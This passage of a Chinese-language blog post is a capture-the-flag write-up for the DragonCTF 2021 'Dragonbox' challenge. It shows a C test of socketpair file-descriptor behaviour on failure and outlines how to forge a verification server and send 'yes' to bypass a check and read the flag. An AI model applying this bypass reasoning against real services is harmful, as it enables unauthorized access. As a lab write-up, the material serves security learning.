</span></span></code></pre></div><p>也就是当执行失败的时候，<code>g_daemon_fds</code> 是不变的，但是实际上，似乎是会变的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020># chuj @ ubuntu in ~/com/dragonctf/Dragonbox [4:02:12] 
</span></span></span><span style=display:flex><span><span style=color:#007020></span><span>$</span> cat test.c 
</span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/socket.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> fds[<span style=color:#40a070>2</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> x <span style=color:#666>=</span> socketpair(AF_UNIX, SOCK_DGRAM <span style=color:#666>|</span> SOCK_SEQPACKET, <span style=color:#40a070>0</span>, fds);
</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;x:%d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>fds[0]:%d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>fds[1]:%d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, x, fds[<span style=color:#40a070>0</span>], fds[<span style=color:#40a070>1</span>]);
</span></span><span style=display:flex><span>    x <span style=color:#666>=</span> socketpair(AF_UNIX, SOCK_STREAM, <span style=color:#40a070>0</span>, fds);
</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;x:%d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>fds[0]:%d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>fds[1]:%d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, x, fds[<span style=color:#40a070>0</span>], fds[<span style=color:#40a070>1</span>]);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020># chuj @ ubuntu in ~/com/dragonctf/Dragonbox [4:05:12] 
</span></span></span><span style=display:flex><span><span style=color:#007020></span><span>$</span> gcc test.c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020># chuj @ ubuntu in ~/com/dragonctf/Dragonbox [4:05:13] 
</span></span></span><span style=display:flex><span><span style=color:#007020></span><span>$</span> .<span style=color:#666>/</span>a.out              
</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>x</span>:<span style=color:#666>-</span><span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>fds[<span style=color:#40a070>0</span>]<span style=color:#666>:</span><span style=color:#40a070>3</span>
</span></span><span style=display:flex><span>fds[<span style=color:#40a070>1</span>]<span style=color:#666>:</span><span style=color:#40a070>4</span>
</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>x</span>:<span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>fds[<span style=color:#40a070>0</span>]<span style=color:#666>:</span><span style=color:#40a070>3</span>
</span></span><span style=display:flex><span>fds[<span style=color:#40a070>1</span>]<span style=color:#666>:</span><span style=color:#40a070>4</span>
</span></span></code></pre></div><p>并且成功打开后还是会使用原来的 fd。但是实际上并没有真正生成“验证服务器”。由此我们就可以多次连接到服务器，伪造一个服务器，发送 <code>yes</code> 绕过检测读出 flag。</p><h3 id=reference>reference</h3><blockquote><p><a href=https://kileak.github.io/ctf/2021/dragoncf21-dragonbox/>dragonbox</a></p><p><a href=https://kileak.github.io/ctf/2021/dragoncf21-noflippidy/>noflippidy</a></p></blockquote></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/jchu95495236 rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>